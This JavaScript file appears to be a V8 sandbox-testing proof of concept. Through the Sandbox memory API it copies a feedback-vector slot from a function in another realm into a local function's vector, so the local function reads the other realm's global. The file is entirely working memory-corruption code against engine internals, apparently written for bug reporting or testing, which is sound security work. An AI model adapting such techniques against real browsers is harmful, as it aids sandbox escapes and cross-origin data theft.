// C18 H46: cross-realm global PropertyCell alias.
// Requires --sandbox-testing --allow-natives-syntax.
const kHeapObjectTag = 0x1;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE");
const kJSFunctionFeedbackCellOffset =
    Sandbox.getFieldOffset(kJSFunctionType, "feedback_cell");
const kFeedbackCellType = Sandbox.getInstanceTypeIdFor("FEEDBACK_CELL_TYPE");
const kFeedbackCellValueOffset =
    Sandbox.getFieldOffset(kFeedbackCellType, "value");

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (ptr, offset) =>
    memory.getUint32(ptr + offset - kHeapObjectTag, true);
const setField = (ptr, offset, value) =>
    memory.setUint32(ptr + offset - kHeapObjectTag, value, true);
const slotOffset = (slot) => 4 * (7 + slot);

function feedbackVectorOf(fn) {
  let fp = getPtr(fn);
  let fc = getField(fp, kJSFunctionFeedbackCellOffset);
  return getField(fc, kFeedbackCellValueOffset);
}

var C18_H46_A = 13;
function f() {
  return C18_H46_A;
}

let realm = Realm.createAllowCrossRealmAccess();
let g = Realm.eval(realm, `
  var C18_H46_B = 99;
  function g() { return C18_H46_B; }
  g;
`);

%EnsureFeedbackVectorForFunction(f);
%EnsureFeedbackVectorForFunction(g);
for (let i = 0; i < 1000; i++) {
  f();
  g();
}

let fvF = feedbackVectorOf(f);
let fvG = feedbackVectorOf(g);
setField(fvF, slotOffset(0), getField(fvG, slotOffset(0)));

print(`after-corrupt f=${f()} g=${g()}`);
C18_H46_A = 44;
Realm.eval(realm, `C18_H46_B = 1234`);
print(`after-writes f=${f()} A=${C18_H46_A} g=${g()}`);
print("reads_cross_realm_B", f() === g());
print("done");
